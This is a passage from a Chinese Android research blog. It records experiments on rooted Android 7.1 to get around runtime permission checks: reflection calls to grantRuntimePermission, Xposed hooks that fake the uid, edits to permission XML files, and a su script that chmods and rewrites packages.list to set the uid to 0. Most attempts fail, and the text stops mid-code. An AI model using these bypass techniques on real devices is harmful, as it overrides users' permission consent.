&#125;</span><br></pre></td></tr></table></figure><p>方法末尾加入反射代码即可。具体打包和执行过程，参考<a href="https://blog.csdn.net/u014418171/article/details/103868878?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160930023616780302911830%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=160930023616780302911830&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-103868878.first_rank_v2_pc_rank_v29&utm_term=Android%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BD%BF%E7%94%A8root%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B%E6%9C%BA%E5%88%B6,%E5%BC%BA%E8%A1%8C%E8%87%AA%E5%8A%A8%E5%85%81%E8%AE%B8%E5%BA%94%E7%94%A8%E7%9A%84%E6%82%AC%E6%B5%AE%E7%AA%97/%E5%BA%94%E7%94%A8%E5%90%8E%E5%8F%B0%E5%BC%B9%E5%87%BA%E7%95%8C%E9%9D%A2%E7%AD%89%E6%9D%83%E9%99%90" target="_blank" rel="noopener">大佬文章</a>不再赘述。</p><p>大佬的文章中采用了直接修改framework源码的方法，并且成功了，但是这种方法需要一定的ROM源码知识，我们选择了反射的方法调用<code>IAppOpsService.setMode</code>，最终执行并没有成功。考虑权限设置是否有两套机制，又反射调了<code>IPackageManager.grantRuntimePermission()</code>，即应用弹框请求权限时最终调用的方法。</p><p>在<a href="https://sleepydogyp.github.io/2020/12/21/Android%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#more" target="_blank" rel="noopener">权限控制源码分析</a>一文中我们可以看到，在<code>ActivityThread.getPackageManager()</code>中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IBinder b = ServiceManager.getService(<span class="string">"package"</span>);</span><br><span class="line">sPackageManager = IPackageManager.Stub.asInterface(b);</span><br></pre></td></tr></table></figure><p>这里的<code>sPackageManager</code>就是<code>IPackageManager</code>类型的对象，<code>PackageManagerService</code>实现了<code>IpackageManager</code>。</p><p>然后，调用<code>grantRuntimePermission()</code>方法，传入包名，权限，uid即可。</p><p>代码参考：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// IBinder b = ServiceManager.getService("package");</span></span><br><span class="line">    Class class_serviceManager = Class.forName(<span class="string">"android.os.ServiceManager"</span>);</span><br><span class="line">    Method method_getService = class_serviceManager.getMethod(<span class="string">"getService"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    Object result_IBinder = method_getService.invoke(<span class="keyword">null</span>, <span class="string">"package"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sPackageManager = IPackageManager.Stub.asInterface(b);</span></span><br><span class="line">    Class class_IPackageManager_Stub = Class.forName(<span class="string">"com.android.internal.app.IPackageManager$Stub"</span>);</span><br><span class="line">    Method method_asInterface = class_IPackageManager_Stub.getMethod(<span class="string">"asInterface"</span>, Class.forName(<span class="string">"android.os.IBinder"</span>));</span><br><span class="line">    Object result_service = method_asInterface.invoke(<span class="keyword">null</span>, result_IBinder);</span><br><span class="line"></span><br><span class="line">    Class class_IpackageManager = Class.forName(<span class="string">"com.android.internal.app.IPackageManager"</span>);</span><br><span class="line">    Method method_grantRuntimePermission = class_IpackageManager.getMethod(<span class="string">"grantRuntimePermission"</span>, String<span class="class">.<span class="keyword">class</span>, <span class="title">String</span>.<span class="title">class</span>, <span class="title">int</span>.<span class="title">class</span>)</span>;</span><br><span class="line">    method_grantRuntimePermission.invoke(result_service, packagename, permission, uid);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译执行没有报错，但是最终对权限并无改变。</p><h3 id="修改uid"><a href="#修改uid" class="headerlink" title="修改uid"></a>修改uid</h3><p>先说结论：方法不可行。因为不管是在 /data/system/packages.list, /data/system/packages.xml文件中修改，还是通过hook修改传入的uid，都只是在上层打转，并没有改变<code>Setings</code>对象中存放的权限情况。</p><p>还是说说具体实践过程吧，纯粹做个记录防止回头又掉进这个坑。</p><p>（1）hook</p><p>主要hook了几个获取uid的方法：UserHandle类的getUid、getIdentifier、getUserId，Process类的myUid。代码示例:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">XposedHelpers.findAndHookMethod(UserHandle.class, "getUid", int.class, int.class, new XC_MethodHook() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.afterHookedMethod(param);</span><br><span class="line">        param.setResult(<span class="number">1000</span>);</span><br><span class="line">        XposedBridge.log(<span class="string">"UserHandle-&gt;getUid:1000"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>hook虽然成功了，修改了应用的uid, 但是对授权并没有什么用。</p><p>（2）修改存放应用权限的文件信息</p><p> /data/system目录中的packages.list和packages.xml两个文件分别存放了应用的uid、安装路径信息和授予的权限信息。</p><p>找到<code>package</code>标签中<code>name=包名</code>的项，在<code>&lt;perm&gt;</code>字段增加权限：</p><p> <code>&lt;item name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; granted=&quot;true&quot; flags=&quot;0&quot; /&gt;</code> </p><p><code>&lt;item name=&quot;android.permission.READ_EXTERNAL_STORAGE&quot; granted=&quot;true&quot; flags=&quot;0&quot; /&gt;</code></p><p>保存文件。</p><p>点击运行应用，发现并未生效。重启设备，发现新增的字段没有了。手动在设备的”设置“中修改权限，发现此文件并未改变，还是只有系统默认授予的权限。</p><p>另外还有一个文件<code>/data/system/users/0/runtime-permissions.xml</code>，保存了实时的权限信息，在“设置”中，修改授权情况会直接将权限信息写入此文件。</p><p><code>&lt;pkg name=&quot;com.xxx&quot;&gt; &lt;item name=&quot;android.permission.READ_SMS&quot; granted=&quot;true&quot; flags=&quot;0&quot; /&gt; &lt;item name=&quot;android.permission.READ_CALENDAR&quot; granted=&quot;true&quot; flags=&quot;0&quot; /&gt; &lt;item name=&quot;android.permission.READ_CALL_LOG&quot; granted=&quot;true&quot; flags=&quot;0&quot; /&gt; &lt;item name=&quot;android.permission.ACCESS_FINE_LOCATION&quot; granted=&quot;true&quot; flags=&quot;0&quot; /&gt;&lt;/pkg&gt;</code></p><p>尝试手动在文件中添加以上内容，重启设备后又恢复之前的状态了，也没有生效。</p><h3 id="读写runtime-permissions-xml源码分析"><a href="#读写runtime-permissions-xml源码分析" class="headerlink" title="读写runtime-permissions.xml源码分析"></a>读写runtime-permissions.xml源码分析</h3><p>分析一下在哪里读了这个文件。</p><p>在Settings类中，可以看到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String RUNTIME_PERMISSIONS_FILE_NAME = <span class="string">"runtime-permissions.xml"</span>;</span><br></pre></td></tr></table></figure><p>搜索<code>RUNTIME_PERMISSIONS_FILE_NAME</code>,找到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1372</span>    <span class="function"><span class="keyword">private</span> File <span class="title">getUserRuntimePermissionsFile</span><span class="params">(<span class="keyword">int</span> userId)</span> </span>&#123;</span><br><span class="line"><span class="number">1373</span>        <span class="comment">// <span class="doctag">TODO:</span> Implement a cleaner solution when adding tests.</span></span><br><span class="line"><span class="number">1374</span>        <span class="comment">// This instead of Environment.getUserSystemDirectory(userId) to support testing.</span></span><br><span class="line"><span class="number">1375</span>        File userDir = <span class="keyword">new</span> File(<span class="keyword">new</span> File(mSystemDir, <span class="string">"users"</span>), Integer.toString(userId));</span><br><span class="line"><span class="number">1376</span>        <span class="keyword">return</span> <span class="keyword">new</span> File(userDir, RUNTIME_PERMISSIONS_FILE_NAME);</span><br><span class="line"><span class="number">1377</span>    &#125;</span><br></pre></td></tr></table></figure><p>返回该文件的File对象。搜索<code>getUserRuntimePermissionsFile</code>方法，找到了<code>readStateForUserSyncLPr()</code>读取该文件。调用此方法的位置只有一处，在<code>readLPw</code>方法中。同样的<code>readLPw</code>方法也读了<code>packages.xml</code>文件。而<code>readLPw</code>有且只有在<code>PackageManagerService</code>的构造方法中调用了，说明开机时确实是读了<code>runtime-permissions.xml</code>文件。</p><p>然后分析下在哪里写了文件。</p><p><code>runtime-permissions.xml</code>文件的编辑在Settings类中，<code>PackageManagerService</code>构造方法中调用了<code>updatePermissionsLPw()</code>方法，里面调用了Settings对象的<code>grantPermissionsLPw</code>方法，此方法最终调用<code>writPermissionsSync</code>，也就是说授予权限时会写入该文件：（具体过程在<a href="https://sleepydogyp.github.io/2020/12/21/Android%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#more" target="_blank" rel="noopener">授权源码分析</a>一文中）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4984</span>        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writePermissionsSync</span><span class="params">(<span class="keyword">int</span> userId)</span> </span>&#123;</span><br><span class="line"><span class="number">4985</span>            AtomicFile destination = <span class="keyword">new</span> AtomicFile(getUserRuntimePermissionsFile(userId));</span><br><span class="line">    ......</span><br><span class="line">         FileOutputStream out = <span class="keyword">null</span>;</span><br><span class="line"><span class="number">5021</span>            <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">5022</span>                out = destination.startWrite();</span><br><span class="line"><span class="number">5023</span></span><br><span class="line"><span class="number">5024</span>                XmlSerializer serializer = Xml.newSerializer();</span><br><span class="line">    ......</span><br><span class="line">        <span class="keyword">if</span> (mRestoredUserGrants.get(userId) != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="number">5064</span>                    ArrayMap&lt;String, ArraySet&lt;RestoredPermissionGrant&gt;&gt; restoredGrants =</span><br><span class="line"><span class="number">5065</span>                            mRestoredUserGrants.get(userId);</span><br><span class="line"><span class="number">5066</span>                    <span class="keyword">if</span> (restoredGrants != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="number">5067</span>                        <span class="keyword">final</span> <span class="keyword">int</span> pkgCount = restoredGrants.size();</span><br><span class="line"><span class="number">5068</span>                        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pkgCount; i++) &#123;</span><br><span class="line"><span class="number">5069</span>                            <span class="keyword">final</span> ArraySet&lt;RestoredPermissionGrant&gt; pkgGrants =</span><br><span class="line"><span class="number">5070</span>                                    restoredGrants.valueAt(i);</span><br><span class="line"><span class="number">5071</span>                            <span class="keyword">if</span> (pkgGrants != <span class="keyword">null</span> &amp;&amp; pkgGrants.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">5072</span>                                <span class="keyword">final</span> String pkgName = restoredGrants.keyAt(i);</span><br><span class="line"><span class="number">5073</span>                                serializer.startTag(<span class="keyword">null</span>, TAG_RESTORED_RUNTIME_PERMISSIONS);</span><br><span class="line"><span class="number">5074</span>                                serializer.attribute(<span class="keyword">null</span>, ATTR_PACKAGE_NAME, pkgName);</span><br><span class="line">    ......</span><br><span class="line"><span class="number">5103</span>                serializer.endDocument();</span><br><span class="line"><span class="number">5104</span>                destination.finishWrite(out);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就将包的权限信息写入了<code>runtime-permissions.xml</code>文件。</p><p><strong>失败原因：</strong></p><p>关键在<code>runtime-permissions.xml</code>文件，在设备中的”设置“修改权限时，文件同步更新了，修改文件的话却没办法更新权限，涉及到某些存储权限信息的字段，还未找到。</p><p>至于通过hook修改uid,也只能在checkPermission时起到绕过作用，具体调用接口还是没有权限。还尝试了hook权限申请弹框的代码，也并没有什么用（涉及到framework层，难道说尝试修改ROM才是最终秘诀？）。</p><p>另外，测试使用的是小米，跟原生系统的权限控制不太一样。</p><p>小米应用权限设置页Activity：</p><blockquote><p> ACTIVITY com.miui.securitycenter/com.miui.permcenter.permissions.PermissionsEditorActivity b347418 pid=6791</p></blockquote><p>原生系统应用权限设置页：</p><blockquote><p>ACTIVITY com.google.android.permissioncontroller/com.android.packageinstaller.permission.ui.ManagePermissionsActivity 23a5170 pid=4142</p><p> ACTIVITY com.google.android.permissioncontroller/com.android.packageinstaller.permission.ui.AppPermissionActivity 9e17de6 pid=4142</p></blockquote><hr><p>还尝试了把APP改成系统应用，以为就可以随便获取权限了。但是Android 7之后就不行了，系统应用要使用涉及隐私的接口，也需要弹框向用户申请权限。</p><p>在实践这个方法的时候，使用小米手机碰到了挂载文件系统问题，刷入了一些第三方包还把手机刷成砖，废了半天劲才挽救回来。。。。</p><p><strong>总结一下：</strong></p><p>不管是反射还是hook都要在framework层下手,要么研究怎么修改ROM，要么研究使用Magisk怎么在设备开机初始化之前修改配置。</p><p>经过十几天的抓耳挠腮，上蹿下跳，目前还处于“山重水复疑无路”阶段。不过，鲁迅说过：“排除掉错误的路线，剩下的就是对的路线。”（鲁迅：我没有，别瞎说。）多多尝试，就算没结果，也会有收获。    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;*郑重声明：本文内容只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;上回说到我们考虑两种方法：&lt;/p&gt;
&lt;p&gt;（1）通过反射，调用PackageManagerService中的设置权限的方法，直接传入权限和
      
    
    </summary>
    
    
      <category term="Android源码分析" scheme="http://yoursite.com/categories/Android%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
      <category term="Android实验笔记" scheme="http://yoursite.com/categories/Android%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/Android%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Android绕过授权方法实践</title>
    <link href="http://yoursite.com/2020/12/30/Android%E7%BB%95%E8%BF%87%E6%8E%88%E6%9D%83%E6%96%B9%E6%B3%95%E5%AE%9E%E8%B7%B5/"/>
    <id>http://yoursite.com/2020/12/30/Android%E7%BB%95%E8%BF%87%E6%8E%88%E6%9D%83%E6%96%B9%E6%B3%95%E5%AE%9E%E8%B7%B5/</id>
    <published>2020-12-30T02:04:55.000Z</published>
    <updated>2021-01-04T02:04:30.590Z</updated>
    
    <content type="html"><![CDATA[<p><strong>*郑重声明：本文内容只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。</strong></p><p><em>设备</em>：<strong>root</strong>过的Android7.1</p><p>在<a href="https://sleepydogyp.github.io/2020/12/21/Android%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#more" target="_blank" rel="noopener">上篇文章</a>中我们跟着沿着源码追溯了Android系统授权的过程，这篇文章记录下怎么绕过系统的校验。</p><p>可以看到检查权限时的一个分支为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Root, system server get to do everything.</span></span><br><span class="line">        <span class="keyword">if</span> (uid == <span class="number">0</span> || uid == Process.SYSTEM_UID) &#123;</span><br><span class="line">            <span class="keyword">return</span> PackageManager.PERMISSION_GRANTED;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>也就是说，我们只需要将自己的app的uid伪装成0或者1000即可绕过授权，直接返回<code>PackageManager.PERMISSION_GRANTED</code>.</p><p>在Android 8之前，uid判断在<code>ActivityManager.checkComponentPermission</code>中。从Android 8开始，这段代码前置到了ContextImpl.java中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1659</span>    <span class="meta">@Override</span></span><br><span class="line"><span class="number">1660</span>    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">checkPermission</span><span class="params">(String permission, <span class="keyword">int</span> pid, <span class="keyword">int</span> uid)</span> </span>&#123;</span><br><span class="line"><span class="number">1661</span>        <span class="keyword">if</span> (permission == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="number">1662</span>            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"permission is null"</span>);</span><br><span class="line"><span class="number">1663</span>        &#125;</span><br><span class="line"><span class="number">1664</span></span><br><span class="line"><span class="number">1665</span>        <span class="keyword">final</span> IActivityManager am = ActivityManager.getService();</span><br><span class="line"><span class="number">1666</span>        <span class="keyword">if</span> (am == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="number">1667</span>            <span class="comment">// Well this is super awkward; we somehow don't have an active</span></span><br><span class="line"><span class="number">1668</span>            <span class="comment">// ActivityManager instance. If we're testing a root or system</span></span><br><span class="line"><span class="number">1669</span>            <span class="comment">// UID, then they totally have whatever permission this is.</span></span><br><span class="line"><span class="number">1670</span>            <span class="keyword">final</span> <span class="keyword">int</span> appId = UserHandle.getAppId(uid);</span><br><span class="line"><span class="number">1671</span>            <span class="keyword">if</span> (appId == Process.ROOT_UID || appId == Process.SYSTEM_UID) &#123;</span><br><span class="line"><span class="number">1672</span>                Slog.w(TAG, <span class="string">"Missing ActivityManager; assuming "</span> + uid + <span class="string">" holds "</span> + permission);</span><br><span class="line"><span class="number">1673</span>                <span class="keyword">return</span> PackageManager.PERMISSION_GRANTED;</span><br><span class="line"><span class="number">1674</span>            &#125;</span><br><span class="line"><span class="number">1675</span>        &#125;</span><br><span class="line"><span class="number">1676</span></span><br><span class="line"><span class="number">1677</span>        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">1678</span>            <span class="keyword">return</span> am.checkPermission(permission, pid, uid);</span><br><span class="line"><span class="number">1679</span>        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line"><span class="number">1680</span>            <span class="keyword">throw</span> e.rethrowFromSystemServer();</span><br><span class="line"><span class="number">1681</span>        &#125;</span><br><span class="line"><span class="number">1682</span>    &#125;</span><br></pre></td></tr></table></figure><p>我们以新版本为例进行绕过实践。</p><h4 id="修改uid之getuid"><a href="#修改uid之getuid" class="headerlink" title="修改uid之getuid"></a>修改uid之getuid</h4><p>一开始我的思路是，既然设备已经root了，直接执行<code>su</code>不就好了。实践证明不可行。</p><blockquote><p>Runtime.exec(“su”)后 只是这个返回Process类的输出流其写入的命令行参数执行的环境才是uid=0的进程环境, 在此之外, 整个app 的uid并不是0, 而是不变。</p></blockquote><p>那么，考虑利用<code>su</code>直接修改记录了uid的<code>/data/system.packages.list</code>,把对应的uid改为0。</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">        Process process = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            process = Runtime.getRuntime().exec(<span class="string">"su"</span>);</span><br><span class="line">            DataOutputStream dataOutputStream = <span class="keyword">new</span> DataOutputStream(process.getOutputStream());</span><br><span class="line">            dataOutputStream.writeBytes(<span class="string">"chmod 777 /data/system/packages.list \n"</span>);</span><br><span class="line">            dataOutputStream.writeBytes(<span class="string">"sed -i '/package.name/d' /data/system/packages.list \n"</span>);</span><br><span class="line">            dataOutputStream.writeBytes(<span class="string">"sed -i '$a package.name 0 1 /data/user/0/com.android.sparrow default 3003'  /data/system/packages.list"</span>);</span><br><span class="line"><span class="comment">//            dataOutputStream.writeBytes("reboot \n");</span></span><br><span class="line"></span><br><span class="line">            dataOutputStream.flush();</span><br><span class="line">            dataOutputStream.close();</span><br><span class="line">            process.waitFor();</span><br><span class="line">            process.destroy();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>执行成功！</p><p><img src="packages_list_before.png" alt=""></p><p><img src="packages_list_after.png" alt=""></p><p>但是app读取的uid依然没变，说明判断权限时的UID不是从这个文件读取的。</p><p><code>ActivityCompat.checkSelfPermission()</code>中的调用语句：<code>context.checkPermission(permission, android.os.Process.myPid(), Process.myUid())</code></p><p>可以看出uid是由<code>Process.myUid()</code>返回的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">myUid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Os.getuid();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Os:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * See &lt;a href="http://man7.org/linux/man-pages/man2/getuid.2.html"&gt;getuid(2)&lt;/a&gt;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getuid</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Libcore.os.getuid(); &#125;</span><br></pre></td></tr></table></figure><p>Libcore类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">17</span><span class="keyword">package</span> libcore.io;</span><br><span class="line"><span class="number">18</span></span><br><span class="line"><span class="number">19</span><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Libcore</span> </span>&#123;</span><br><span class="line"><span class="number">20</span>    <span class="function"><span class="keyword">private</span> <span class="title">Libcore</span><span class="params">()</span> </span>&#123; &#125;</span><br><span class="line"><span class="number">21</span></span><br><span class="line"><span class="number">22</span>    <span class="keyword">public</span> <span class="keyword">static</span> Os os = <span class="keyword">new</span> BlockGuardOs(<span class="keyword">new</span> Posix());</span><br><span class="line"><span class="number">23</span>&#125;</span><br></pre></td></tr></table></figure><p>可知调用了BlockGuardOs对象的getUid()方法，实现在其父类ForwardingOs：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getuid</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> os.getuid(); &#125;</span><br></pre></td></tr></table></figure><p>这里的os即为传入的Posix对象，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">protected</span> <span class="keyword">final</span> Os os;</span><br><span class="line"><span class="number">48</span></span><br><span class="line"><span class="number">49</span>    <span class="function"><span class="keyword">public</span> <span class="title">ForwardingOs</span><span class="params">(Os os)</span> </span>&#123;</span><br><span class="line"><span class="number">50</span>        <span class="keyword">this</span>.os = os;</span><br><span class="line"><span class="number">51</span>    &#125;</span><br><span class="line"><span class="number">98</span>    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getuid</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> os.getuid(); &#125;</span><br></pre></td></tr></table></figure><p>Posix中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">getuid</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>调用了Native方法。</p><p><a href="http://androidxref.com/6.0.1_r10/xref/libcore/luni/src/main/native/libcore_io_Posix.cpp" target="_blank" rel="noopener">http://androidxref.com/6.0.1_r10/xref/libcore/luni/src/main/native/libcore_io_Posix.cpp</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> jint <span class="title">Posix_getuid</span><span class="params">(JNIEnv*, jobject)</span> </span>&#123;</span><br><span class="line"><span class="number">1062</span>    <span class="keyword">return</span> getuid();</span><br><span class="line"><span class="number">1063</span>&#125;</span><br></pre></td></tr></table></figure><p>到这里，本该去看getuid()的实现，但是到这里就断了，没有找到。</p><p>没办法，只能回头看看uid是怎么产生的，看能不能在生成uid时动动手脚。</p><h4 id="修改uid之生成uid"><a href="#修改uid之生成uid" class="headerlink" title="修改uid之生成uid"></a>修改uid之生成uid</h4><p>uid是应用安装时被分配的，具体过程的源码分析网上比较多，这里不具体说了。</p><p>涉及到的关键类<code>PackageManagerService</code>，它负责解析AndroidManifest.xml，从中得到应用程序相关信息。</p><p><a href="http://androidxref.com/6.0.1_r10/xref/frameworks/base/services/core/java/com/android/server/pm/PackageManagerService.java" target="_blank" rel="noopener">http://androidxref.com/6.0.1_r10/xref/frameworks/base/services/core/java/com/android/server/pm/PackageManagerService.java</a></p><p>从<code>PackageManagerService.main()</code>入手，它负责把PackageManagerService启动起来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> PackageManagerService <span class="title">main</span><span class="params">(Context context, Installer installer,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">1766</span>            <span class="keyword">boolean</span> factoryTest, <span class="keyword">boolean</span> onlyCore)</span> </span>&#123;</span><br><span class="line"><span class="number">1767</span>        PackageManagerService m = <span class="keyword">new</span> PackageManagerService(context, installer,</span><br><span class="line"><span class="number">1768</span>                factoryTest, onlyCore);</span><br><span class="line"><span class="number">1769</span>        ServiceManager.addService(<span class="string">"package"</span>, m);</span><br><span class="line"><span class="number">1770</span>        <span class="keyword">return</span> m;</span><br><span 